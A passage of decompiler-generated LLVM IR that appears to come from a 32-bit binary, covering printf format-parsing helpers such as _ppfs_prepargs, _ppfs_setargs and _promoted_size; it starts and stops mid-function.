  %v1_80522b4 = add i32 %v0_80522b428, 1
  store i32 %v1_80522b4, i32* %eax.global-to-local, align 4
  %v1_80522b5 = inttoptr i32 %v1_80522b4 to i8*
  %v2_80522b5 = load i8, i8* %v1_80522b5, align 1
  %v11_80522b5 = icmp eq i8 %v2_80522b5, 37
  br i1 %v11_80522b5, label %dec_label_pc_80522d0, label %dec_label_pc_80522ba

dec_label_pc_80522ba:                             ; preds = %dec_label_pc_80522b4
  %v1_80522bd = load i32, i32* @ebx, align 4
  %v2_80522bd = inttoptr i32 %v1_80522bd to i32*
  store i32 %v1_80522b4, i32* %v2_80522bd, align 4
  %v0_80522bf = load i32, i32* @ebx, align 4
  %v1_80522c0 = inttoptr i32 %v0_80522bf to i32*
  %v2_80522c0 = call i32 @_ppfs_parsespec(i32* %v1_80522c0)
  store i32 %v2_80522c0, i32* %eax.global-to-local, align 4
  %v2_80522c8 = icmp slt i32 %v2_80522c0, 0
  br i1 %v2_80522c8, label %dec_label_pc_80522db, label %dec_label_pc_80522cc

dec_label_pc_80522cc:                             ; preds = %dec_label_pc_80522ba
  %v0_80522cc = load i32, i32* @ebx, align 4
  %v1_80522cc = inttoptr i32 %v0_80522cc to i32*
  %v2_80522cc = load i32, i32* %v1_80522cc, align 4
  %v4_80522d1.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80522d1.backedge

dec_label_pc_80522d0:                             ; preds = %dec_label_pc_80522b4, %dec_label_pc_80522af
  %v0_80522d0 = phi i32 [ %v1_80522b4, %dec_label_pc_80522b4 ], [ %v0_80522b428, %dec_label_pc_80522af ]
  %v1_80522d0 = add i32 %v0_80522d0, 1
  br label %dec_label_pc_80522d1.backedge

dec_label_pc_80522d1.backedge:                    ; preds = %dec_label_pc_80522d0, %dec_label_pc_80522cc
  %v4_80522d1.be = phi i32 [ %v4_80522d1.pre.pre, %dec_label_pc_80522cc ], [ %v6_80522d130, %dec_label_pc_80522d0 ]
  %v0_80522b4.be = phi i32 [ %v2_80522cc, %dec_label_pc_80522cc ], [ %v1_80522d0, %dec_label_pc_80522d0 ]
  store i32 %v0_80522b4.be, i32* %eax.global-to-local, align 4
  %v1_80522d1 = inttoptr i32 %v0_80522b4.be to i8*
  %v2_80522d1 = load i8, i8* %v1_80522d1, align 1
  %v3_80522d1 = zext i8 %v2_80522d1 to i32
  %v5_80522d1 = and i32 %v4_80522d1.be, -256
  %v6_80522d1 = or i32 %v3_80522d1, %v5_80522d1
  store i32 %v6_80522d1, i32* %edx.global-to-local, align 4
  %v4_80522d3 = icmp eq i8 %v2_80522d1, 0
  %v1_80522d5 = icmp eq i1 %v4_80522d3, false
  br i1 %v1_80522d5, label %dec_label_pc_80522af, label %dec_label_pc_80522d1.dec_label_pc_80522d7_crit_edge

dec_label_pc_80522d1.dec_label_pc_80522d7_crit_edge: ; preds = %dec_label_pc_80522d1.backedge
  %v0_80522d7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80522d7

dec_label_pc_80522d7:                             ; preds = %dec_label_pc_80522d1.dec_label_pc_80522d7_crit_edge, %dec_label_pc_80522a6
  %v0_80522d7 = phi i32 [ %v0_80522d7.pre, %dec_label_pc_80522d1.dec_label_pc_80522d7_crit_edge ], [ %v0_80522a6, %dec_label_pc_80522a6 ]
  %v1_80522d7 = load i32, i32* @ebx, align 4
  %v2_80522d7 = inttoptr i32 %v1_80522d7 to i32*
  store i32 %v0_80522d7, i32* %v2_80522d7, align 4
  br label %dec_label_pc_80522db

dec_label_pc_80522db:                             ; preds = %dec_label_pc_80522ba, %dec_label_pc_80522d7
  %storemerge = phi i32 [ 0, %dec_label_pc_80522d7 ], [ -1, %dec_label_pc_80522ba ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_80522db = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80522db, i32* @edx, align 4
  %v2_80522dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80522dc, i32* @ebx, align 4
  store i32 %v0_8052270, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_80522d1, { 1, 0 }
  uselistorder i8 %v2_80522d1, { 1, 2, 0 }
  uselistorder i32 %v0_80522b4.be, { 2, 1, 0 }
  uselistorder i32 %v0_80522b428, { 1, 0 }
  uselistorder i32 %v0_80522a6, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80522a3, { 0, 2, 1 }
  uselistorder i32 %v1_80522a0, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 8, 4, 6, 5, 7 }
  uselistorder i32 188, { 1, 0 }
  uselistorder label %dec_label_pc_80522db, { 1, 0 }
  uselistorder label %dec_label_pc_80522af, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_80522e0 = load i32, i32* @esi, align 4
  %v0_80522e1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80522ed = add i32 %arg1, 24
  %v2_80522ed = inttoptr i32 %v1_80522ed to i32*
  %v3_80522ed = load i32, i32* %v2_80522ed, align 4
  %v2_80522f0 = add i32 %arg1, 76
  %v3_80522f0 = inttoptr i32 %v2_80522f0 to i32*
  store i32 %arg2, i32* %v3_80522f0, align 4
  %tmp8 = icmp slt i32 %v3_80522ed, 1
  br i1 %tmp8, label %dec_label_pc_805231e, label %dec_label_pc_80522f7

dec_label_pc_80522f7:                             ; preds = %entry
  %v1_80522fa = load i32, i32* @ebx, align 4
  %v2_80522fa = add i32 %v1_80522fa, 28
  %v3_80522fa = inttoptr i32 %v2_80522fa to i32*
  store i32 %v3_80522ed, i32* %v3_80522fa, align 4
  %v0_80522fd = load i32, i32* @ebx, align 4
  %v1_80522fd = add i32 %v0_80522fd, 24
  %v2_80522fd = inttoptr i32 %v1_80522fd to i32*
  store i32 0, i32* %v2_80522fd, align 4
  %v0_8052304 = load i32, i32* @ebx, align 4
  %v1_8052304 = add i32 %v0_8052304, 4
  %v2_8052304 = inttoptr i32 %v1_8052304 to i32*
  store i32 0, i32* %v2_8052304, align 4
  %v0_805230b = load i32, i32* @ebx, align 4
  %v1_805230b = add i32 %v0_805230b, 8
  %v2_805230b = inttoptr i32 %v1_805230b to i32*
  store i32 0, i32* %v2_805230b, align 4
  %v0_8052312 = load i32, i32* @ebx, align 4
  %v1_8052313 = call i32 @_ppfs_setargs(i32 %v0_8052312)
  %v1_805231b = load i32, i32* @ebx, align 4
  %v2_805231b = add i32 %v1_805231b, 24
  %v3_805231b = inttoptr i32 %v2_805231b to i32*
  store i32 %v3_80522ed, i32* %v3_805231b, align 4
  br label %dec_label_pc_805231e

dec_label_pc_805231e:                             ; preds = %entry, %dec_label_pc_80522f7
  %v2_805231e = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_80522e1, i32* @ebx, align 4
  store i32 %v0_80522e0, i32* @esi, align 4
  ret i32 %v2_805231e

; uselistorder directives
  uselistorder i32 %v3_80522ed, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805231e, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052325 = load i32, i32* @ebx, align 4
  store i32 %v0_8052325, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_805232a = add i32 %arg1, 24
  %v2_805232a = inttoptr i32 %v1_805232a to i32*
  %v3_805232a = load i32, i32* %v2_805232a, align 4
  %v4_805232a = icmp eq i32 %v3_805232a, 0
  %v1_805232e = add i32 %arg1, 80
  store i32 %v1_805232e, i32* %ebx.global-to-local, align 4
  %v1_8052331 = icmp eq i1 %v4_805232a, false
  %v1_80523e9 = add i32 %arg1, 8
  %v2_80523e9 = inttoptr i32 %v1_80523e9 to i32*
  %v3_80523e9 = load i32, i32* %v2_80523e9, align 4
  %v8_80523e9 = icmp eq i32 %v3_80523e9, -2147483648
  %v1_80523f0 = icmp eq i1 %v8_80523e9, false
  br i1 %v1_8052331, label %dec_label_pc_80523e9, label %dec_label_pc_8052337

dec_label_pc_8052337:                             ; preds = %entry
  br i1 %v1_80523f0, label %dec_label_pc_8052351, label %dec_label_pc_8052340

dec_label_pc_8052340:                             ; preds = %dec_label_pc_8052337
  %v1_8052340 = add i32 %arg1, 76
  %v2_8052340 = inttoptr i32 %v1_8052340 to i32*
  %v3_8052340 = load i32, i32* %v2_8052340, align 4
  store i32 %v3_8052340, i32* %eax.global-to-local, align 4
  %v1_8052343 = add i32 %v3_8052340, 4
  store i32 %v1_8052343, i32* %edx.global-to-local, align 4
  store i32 %v1_8052343, i32* %v2_8052340, align 4
  %v0_8052349 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052349 = inttoptr i32 %v0_8052349 to i32*
  %v2_8052349 = load i32, i32* %v1_8052349, align 4
  store i32 %v2_8052349, i32* %eax.global-to-local, align 4
  %v1_805234b = load i32, i32* @ecx, align 4
  %v2_805234b = add i32 %v1_805234b, 80
  %v3_805234b = inttoptr i32 %v2_805234b to i32*
  store i32 %v2_8052349, i32* %v3_805234b, align 4
  %v0_805234e = load i32, i32* %eax.global-to-local, align 4
  %v1_805234e = load i32, i32* @ecx, align 4
  %v2_805234e = add i32 %v1_805234e, 8
  %v3_805234e = inttoptr i32 %v2_805234e to i32*
  store i32 %v0_805234e, i32* %v3_805234e, align 4
  %v0_8052351.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052351

dec_label_pc_8052351:                             ; preds = %dec_label_pc_8052337, %dec_label_pc_8052340
  %v1_8052360 = phi i32 [ %arg1, %dec_label_pc_8052337 ], [ %v0_8052351.pre, %dec_label_pc_8052340 ]
  %v1_8052351 = add i32 %v1_8052360, 4
  %v2_8052351 = inttoptr i32 %v1_8052351 to i32*
  %v3_8052351 = load i32, i32* %v2_8052351, align 4
  %v8_8052351 = icmp eq i32 %v3_8052351, -2147483648
  %v1_8052358 = icmp eq i1 %v8_8052351, false
  br i1 %v1_8052358, label %dec_label_pc_805236b, label %dec_label_pc_805235a

dec_label_pc_805235a:                             ; preds = %dec_label_pc_8052351
  %v1_805235a = add i32 %v1_8052360, 76
  %v2_805235a = inttoptr i32 %v1_805235a to i32*
  %v3_805235a = load i32, i32* %v2_805235a, align 4
  store i32 %v3_805235a, i32* %eax.global-to-local, align 4
  %v1_805235d = add i32 %v3_805235a, 4
  store i32 %v1_805235d, i32* %edx.global-to-local, align 4
  store i32 %v1_805235d, i32* %v2_805235a, align 4
  %v0_8052363 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052363 = inttoptr i32 %v0_8052363 to i32*
  %v2_8052363 = load i32, i32* %v1_8052363, align 4
  store i32 %v2_8052363, i32* %eax.global-to-local, align 4
  %v1_8052365 = load i32, i32* @ecx, align 4
  %v2_8052365 = add i32 %v1_8052365, 80
  %v3_8052365 = inttoptr i32 %v2_8052365 to i32*
  store i32 %v2_8052363, i32* %v3_8052365, align 4
  %v0_8052368 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052368 = load i32, i32* @ecx, align 4
  %v2_8052368 = add i32 %v1_8052368, 4
  %v3_8052368 = inttoptr i32 %v2_8052368 to i32*
  store i32 %v0_8052368, i32* %v3_8052368, align 4
  %v1_80523e215.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805236b

dec_label_pc_805236b:                             ; preds = %dec_label_pc_8052351, %dec_label_pc_805235a
  %v1_80523e215 = phi i32 [ %v1_8052360, %dec_label_pc_8052351 ], [ %v1_80523e215.pre, %dec_label_pc_805235a ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_80523e216 = add i32 %v1_80523e215, 28
  %v3_80523e217 = inttoptr i32 %v2_80523e216 to i32*
  %v4_80523e218 = load i32, i32* %v3_80523e217, align 4
  %v5_80523e520 = icmp sgt i32 %v4_80523e218, 0
  br i1 %v5_80523e520, label %dec_label_pc_805236f, label %dec_label_pc_8052417.loopexit

dec_label_pc_805236f:                             ; preds = %dec_label_pc_805236b, %dec_label_pc_80523e1
  %v1_80523e222 = phi i32 [ %v1_80523e2, %dec_label_pc_80523e1 ], [ %v1_80523e215, %dec_label_pc_805236b ]
  %v1_805236f21 = phi i32 [ %v1_80523e1, %dec_label_pc_80523e1 ], [ 0, %dec_label_pc_805236b ]
  %v2_805236f = mul i32 %v1_805236f21, 4
  %v3_805236f = add i32 %v2_805236f, 40
  %v4_805236f = add i32 %v3_805236f, %v1_80523e222
  %v5_805236f = inttoptr i32 %v4_805236f to i32*
  %v6_805236f = load i32, i32* %v5_805236f, align 4
  store i32 %v6_805236f, i32* %eax.global-to-local, align 4
  %v1_8052373 = add i32 %v6_805236f, -8
  %v9_8052373 = icmp eq i32 %v1_8052373, 0
  br i1 %v9_8052373, label %dec_label_pc_80523e1, label %dec_label_pc_8052378

dec_label_pc_8052378:                             ; preds = %dec_label_pc_805236f
  %v10_8052373 = icmp slt i32 %v1_8052373, 0
  %v6_8052373 = sub i32 7, %v6_805236f
  %v7_8052373 = and i32 %v6_8052373, %v6_805236f
  %v8_8052373 = icmp slt i32 %v7_8052373, 0
  %v1_8052378 = add i32 %v1_80523e222, 76
  %v2_8052378 = inttoptr i32 %v1_8052378 to i32*
  %v3_8052378 = load i32, i32* %v2_8052378, align 4
  store i32 %v3_8052378, i32* %edx.global-to-local, align 4
  %v3_805237b = icmp eq i1 %v10_8052373, %v8_8052373
  br i1 %v3_805237b, label %dec_label_pc_805238b, label %dec_label_pc_805237d

dec_label_pc_805237d:                             ; preds = %dec_label_pc_8052378
  %tmp13 = icmp slt i32 %v6_805236f, 3
  %v9_8052384 = icmp eq i32 %v6_805236f, 7
  %v1_8052387 = icmp eq i1 %v9_8052384, false
  %or.cond = or i1 %tmp13, %v1_8052387
  br i1 %or.cond, label %dec_label_pc_80523d4, label %dec_label_pc_80523b6

dec_label_pc_805238b:                             ; preds = %dec_label_pc_8052378
  %tmp14 = icmp sgt i32 %v6_805236f, 1024
  br i1 %tmp14, label %dec_label_pc_8052394, label %dec_label_pc_80523d4

dec_label_pc_8052394:                             ; preds = %dec_label_pc_805238b
  %v6_8052394 = icmp eq i32 %v6_805236f, 2048
  br i1 %v6_8052394, label %dec_label_pc_80523a4, label %dec_label_pc_805239b

dec_label_pc_805239b:                             ; preds = %dec_label_pc_8052394
  %v9_805239b = icmp eq i32 %v6_805236f, 2055
  %v1_80523a0 = icmp eq i1 %v9_805239b, false
  br i1 %v1_80523a0, label %dec_label_pc_80523d4, label %dec_label_pc_80523c5

dec_label_pc_80523a4:                             ; preds = %dec_label_pc_8052394
  %v1_80523a4 = add i32 %v3_8052378, 8
  store i32 %v1_80523a4, i32* %eax.global-to-local, align 4
  store i32 %v1_80523a4, i32* %v2_8052378, align 4
  %v0_80523aa = load i32, i32* %edx.global-to-local, align 4
  %v1_80523aa = inttoptr i32 %v0_80523aa to i32*
  %v2_80523aa = load i32, i32* %v1_80523aa, align 4
  store i32 %v2_80523aa, i32* %eax.global-to-local, align 4
  %v1_80523ac = add i32 %v0_80523aa, 4
  %v2_80523ac = inttoptr i32 %v1_80523ac to i32*
  %v3_80523ac = load i32, i32* %v2_80523ac, align 4
  store i32 %v3_80523ac, i32* %edx.global-to-local, align 4
  %v1_80523af = load i32, i32* %ebx.global-to-local, align 4
  %v2_80523af = inttoptr i32 %v1_80523af to i32*
  store i32 %v2_80523aa, i32* %v2_80523af, align 4
  %v0_80523b1 = load i32, i32* %edx.global-to-local, align 4
  %v1_80523b1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80523b1 = add i32 %v1_80523b1, 4
  %v3_80523b1 = inttoptr i32 %v2_80523b1 to i32*
  store i32 %v0_80523b1, i32* %v3_80523b1, align 4
  br label %dec_label_pc_80523de

dec_label_pc_80523b6:                             ; preds = %dec_label_pc_805237d
  %v3_80523b6 = load i32, i32* %v2_8052378, align 4
  store i32 %v3_80523b6, i32* %edx.global-to-local, align 4
  %v1_80523b9 = add i32 %v3_80523b6, 8
  store i32 %v1_80523b9, i32* %eax.global-to-local, align 4
  store i32 %v1_80523b9, i32* %v2_8052378, align 4
  %v0_80523bf = load i32, i32* %edx.global-to-local, align 4
  %v1_80523bf = inttoptr i32 %v0_80523bf to double*
  %v2_80523bf = load double, double* %v1_80523bf, align 4
  %v2_80523c1 = load i32, i32* %ebx.global-to-local, align 4
  %v4_80523c1 = inttoptr i32 %v2_80523c1 to double*
  store double %v2_80523bf, double* %v4_80523c1, align 4
  br label %dec_label_pc_80523de

dec_label_pc_80523c5:                             ; preds = %dec_label_pc_805239b
  %v3_80523c5 = load i32, i32* %v2_8052378, align 4
  store i32 %v3_80523c5, i32* %edx.global-to-local, align 4
  %v1_80523c8 = add i32 %v3_80523c5, 12
  store i32 %v1_80523c8, i32* %eax.global-to-local, align 4
  store i32 %v1_80523c8, i32* %v2_8052378, align 4
  %v0_80523ce = load i32, i32* %edx.global-to-local, align 4
  %v1_80523ce = inttoptr i32 %v0_80523ce to x86_fp80*
  %v2_80523ce = load x86_fp80, x86_fp80* %v1_80523ce, align 4
  %v2_80523d0 = load i32, i32* %ebx.global-to-local, align 4
  %v3_80523d0 = inttoptr i32 %v2_80523d0 to x86_fp80*
  store x86_fp80 %v2_80523ce, x86_fp80* %v3_80523d0, align 4
  br label %dec_label_pc_80523de

dec_label_pc_80523d4:                             ; preds = %dec_label_pc_805237d, %dec_label_pc_805238b, %dec_label_pc_805239b
  %v1_80523d4 = add i32 %v3_8052378, 4
  store i32 %v1_80523d4, i32* %eax.global-to-local, align 4
  store i32 %v1_80523d4, i32* %v2_8052378, align 4
  %v0_80523da = load i32, i32* %edx.global-to-local, align 4
  %v1_80523da = inttoptr i32 %v0_80523da to i32*
  %v2_80523da = load i32, i32* %v1_80523da, align 4
  store i32 %v2_80523da, i32* %eax.global-to-local, align 4
  %v1_80523dc = load i32, i32* %ebx.global-to-local, align 4
  %v2_80523dc = inttoptr i32 %v1_80523dc to i32*
  store i32 %v2_80523da, i32* %v2_80523dc, align 4
  br label %dec_label_pc_80523de

dec_label_pc_80523de:                             ; preds = %dec_label_pc_80523c5, %dec_label_pc_80523b6, %dec_label_pc_80523a4, %dec_label_pc_80523d4
  %v0_80523de = load i32, i32* %ebx.global-to-local, align 4
  %v1_80523de = add i32 %v0_80523de, 12
  store i32 %v1_80523de, i32* %ebx.global-to-local, align 4
  %v0_80523e1.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_80523e2.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80523e1

dec_label_pc_80523e1:                             ; preds = %dec_label_pc_805236f, %dec_label_pc_80523de
  %v1_80523e2 = phi i32 [ %v1_80523e222, %dec_label_pc_805236f ], [ %v1_80523e2.pre, %dec_label_pc_80523de ]
  %v0_80523e1 = phi i32 [ %v1_805236f21, %dec_label_pc_805236f ], [ %v0_80523e1.pre, %dec_label_pc_80523de ]
  %v1_80523e1 = add i32 %v0_80523e1, 1
  store i32 %v1_80523e1, i32* %esi.global-to-local, align 4
  %v2_80523e2 = add i32 %v1_80523e2, 28
  %v3_80523e2 = inttoptr i32 %v2_80523e2 to i32*
  %v4_80523e2 = load i32, i32* %v3_80523e2, align 4
  %v5_80523e5 = icmp slt i32 %v1_80523e1, %v4_80523e2
  br i1 %v5_80523e5, label %dec_label_pc_805236f, label %dec_label_pc_80523e2.dec_label_pc_8052417.loopexit_crit_edge

dec_label_pc_80523e9:                             ; preds = %entry
  br i1 %v1_80523f0, label %dec_label_pc_8052400, label %dec_label_pc_80523f2

dec_label_pc_80523f2:                             ; preds = %dec_label_pc_80523e9
  %v1_80523f2 = add i32 %arg1, 36
  %v2_80523f2 = inttoptr i32 %v1_80523f2 to i8*
  %v3_80523f2 = load i8, i8* %v2_80523f2, align 1
  %v2_80523f6 = zext i8 %v3_80523f2 to i32
  %v3_80523f6 = mul nuw nsw i32 %v2_80523f6, 12
  store i32 %v3_80523f6, i32* %eax.global-to-local, align 4
  %v2_80523f9 = add i32 %arg1, 68
  %v3_80523f9 = add i32 %v2_80523f9, %v3_80523f6
  %v4_80523f9 = inttoptr i32 %v3_80523f9 to i32*
  %v5_80523f9 = load i32, i32* %v4_80523f9, align 4
  store i32 %v5_80523f9, i32* %eax.global-to-local, align 4
  store i32 %v5_80523f9, i32* %v2_80523e9, align 4
  %v0_8052400.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052400

dec_label_pc_8052400:                             ; preds = %dec_label_pc_80523e9, %dec_label_pc_80523f2
  %v1_8052414 = phi i32 [ %arg1, %dec_label_pc_80523e9 ], [ %v0_8052400.pre, %dec_label_pc_80523f2 ]
  %v1_8052400 = add i32 %v1_8052414, 4
  %v2_8052400 = inttoptr i32 %v1_8052400 to i32*
  %v3_8052400 = load i32, i32* %v2_8052400, align 4
  %v8_8052400 = icmp eq i32 %v3_8052400, -2147483648
  %v1_8052407 = icmp eq i1 %v8_8052400, false
  br i1 %v1_8052407, label %dec_label_pc_8052417, label %dec_label_pc_8052409

dec_label_pc_8052409:                             ; preds = %dec_label_pc_8052400
  %v1_8052409 = add i32 %v1_8052414, 37
  %v2_8052409 = inttoptr i32 %v1_8052409 to i8*
  %v3_8052409 = load i8, i8* %v2_8052409, align 1
  %v2_805240d = zext i8 %v3_8052409 to i32
  %v3_805240d = mul nuw nsw i32 %v2_805240d, 12
  store i32 %v3_805240d, i32* %eax.global-to-local, align 4
  %v1_8052410 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052410 = add nsw i32 %v3_805240d, -12
  %v3_8052410 = add i32 %v2_8052410, %v1_8052410
  %v4_8052410 = inttoptr i32 %v3_8052410 to i32*
  %v5_8052410 = load i32, i32* %v4_8052410, align 4
  store i32 %v5_8052410, i32* %eax.global-to-local, align 4
  store i32 %v5_8052410, i32* %v2_8052400, align 4
  %v0_8052417.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052417

dec_label_pc_80523e2.dec_label_pc_8052417.loopexit_crit_edge: ; preds = %dec_label_pc_80523e1
  br label %dec_label_pc_8052417.loopexit

dec_label_pc_8052417.loopexit:                    ; preds = %dec_label_pc_80523e2.dec_label_pc_8052417.loopexit_crit_edge, %dec_label_pc_805236b
  %v1_80523e2.lcssa = phi i32 [ %v1_80523e2, %dec_label_pc_80523e2.dec_label_pc_8052417.loopexit_crit_edge ], [ %v1_80523e215, %dec_label_pc_805236b ]
  br label %dec_label_pc_8052417

dec_label_pc_8052417:                             ; preds = %dec_label_pc_8052417.loopexit, %dec_label_pc_8052400, %dec_label_pc_8052409
  %v10_805241e = phi i32 [ %v1_80523e2.lcssa, %dec_label_pc_8052417.loopexit ], [ %v1_8052414, %dec_label_pc_8052400 ], [ %v0_8052417.pre, %dec_label_pc_8052409 ]
  %v1_8052417 = add i32 %v10_805241e, 8
  %v2_8052417 = inttoptr i32 %v1_8052417 to i32*
  %v3_8052417 = load i32, i32* %v2_8052417, align 4
  store i32 %v3_8052417, i32* %eax.global-to-local, align 4
  %v2_805241a = icmp slt i32 %v3_8052417, 0
  %v1_805241c = icmp eq i1 %v2_805241a, false
  br i1 %v1_805241c, label %dec_label_pc_8052432, label %dec_label_pc_805241e

dec_label_pc_805241e:                             ; preds = %dec_label_pc_8052417
  %v1_805241e = add i32 %v10_805241e, 16
  %v2_805241e = inttoptr i32 %v1_805241e to i32*
  %v3_805241e = load i32, i32* %v2_805241e, align 4
  %v4_805241e = or i32 %v3_805241e, 8
  store i32 %v4_805241e, i32* %v2_805241e, align 4
  %v0_8052422 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052422 = sub i32 0, %v0_8052422
  store i32 %v1_8052422, i32* %eax.global-to-local, align 4
  %v1_8052424 = load i32, i32* @ecx, align 4
  %v2_8052424 = add i32 %v1_8052424, 8
  %v3_8052424 = inttoptr i32 %v2_8052424 to i32*
  store i32 %v1_8052422, i32* %v3_8052424, align 4
  %v0_8052427 = load i32, i32* @ecx, align 4
  %v1_8052427 = add i32 %v0_8052427, 16
  %v2_8052427 = inttoptr i32 %v1_8052427 to i32*
  %v3_8052427 = load i32, i32* %v2_8052427, align 4
  %v4_8052427 = and i32 %v3_8052427, -2
  store i32 %v4_8052427, i32* %v2_8052427, align 4
  %v0_805242b = load i32, i32* @ecx, align 4
  %v1_805242b = add i32 %v0_805242b, 20
  %v2_805242b = inttoptr i32 %v1_805242b to i32*
  store i32 32, i32* %v2_805242b, align 4
  %v0_8052434.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052432

dec_label_pc_8052432:                             ; preds = %dec_label_pc_8052417, %dec_label_pc_805241e
  %v0_8052434 = phi i32 [ %v3_8052417, %dec_label_pc_8052417 ], [ %v0_8052434.pre, %dec_label_pc_805241e ]
  %v2_8052432 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052432, i32* @ebx, align 4
  ret i32 %v0_8052434

; uselistorder directives
  uselistorder i32 %v3_805240d, { 1, 0 }
  uselistorder i32 %v3_80523f6, { 1, 0 }
  uselistorder i32 %v1_80523e1, { 2, 1, 0 }
  uselistorder i32 %v1_80523e2, { 1, 2, 0 }
  uselistorder i32 %v3_8052378, { 1, 0, 2 }
  uselistorder i32* %v2_8052378, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_8052373, { 1, 0 }
  uselistorder i32 %v6_805236f, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_805236f21, { 1, 0 }
  uselistorder i32 %v1_80523e215, { 2, 0, 1 }
  uselistorder i1 %v1_80523f0, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 6, 5, 8, 7 }
  uselistorder label %dec_label_pc_8052432, { 1, 0 }
  uselistorder label %dec_label_pc_8052417, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052400, { 1, 0 }
  uselistorder label %dec_label_pc_80523e1, { 1, 0 }
  uselistorder label %dec_label_pc_80523de, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80523d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805236f, { 1, 0 }
  uselistorder label %dec_label_pc_805236b, { 1, 0 }
  uselistorder label %dec_label_pc_8052351, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8052438 = load i32, i32* @eax, align 4
  br label %dec_label_pc_805243f

dec_label_pc_805243f:                             ; preds = %dec_label_pc_805243f, %entry
  %v0_805243f = phi i32 [ ptrtoint (i8** @global_var_805a2ca.482 to i32), %entry ], [ %v1_805243f, %dec_label_pc_805243f ]
  %v1_805243f = add i32 %v0_805243f, -2
  %v1_8052442 = inttoptr i32 %v1_805243f to i16*
  %v2_8052442 = load i16, i16* %v1_8052442, align 2
  %v3_8052442 = sext i16 %v2_8052442 to i32
  %v12_8052445 = icmp ne i32 %v3_8052442, %v0_8052438
  %v6_805244f = icmp ugt i32 %v1_805243f, ptrtoint (i32* @global_var_805a2b2.483 to i32)
  %or.cond = and i1 %v6_805244f, %v12_8052445
  br i1 %or.cond, label %dec_label_pc_805243f, label %dec_label_pc_8052451

dec_label_pc_8052451:                             ; preds = %dec_label_pc_805243f
  %.pre = add i32 %v0_805243f, -134587060
  %v2_8052457 = sdiv i32 %.pre, 2
  store i32 %v2_8052457, i32* @edx, align 4
  %v1_8052459 = add i32 %v2_8052457, ptrtoint (i8** @global_var_805a2ca.482 to i32)
  %v2_8052459 = inttoptr i32 %v1_8052459 to i8*
  %v3_8052459 = load i8, i8* %v2_8052459, align 1
  %v4_8052459 = zext i8 %v3_8052459 to i32
  ret i32 %v4_8052459

; uselistorder directives
  uselistorder i32 %v2_8052457, { 1, 0 }
  uselistorder i32 %v1_805243f, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805a2ca.482 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8052462 = load i32, i32* @edi, align 4
  %v0_8052463 = load i32, i32* @esi, align 4
  %v0_8052464 = load i32, i32* @ebx, align 4
  store i32 %v0_8052464, i32* %stack_var_-16, align 4
  %v4_8052464 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_8052490 = add i32 %tmp76, 24
  %v2_8052490 = inttoptr i32 %v1_8052490 to i32*
  %v3_8052490 = load i32, i32* %v2_8052490, align 4
  store i32 %v3_8052490, i32* %eax.global-to-local, align 4
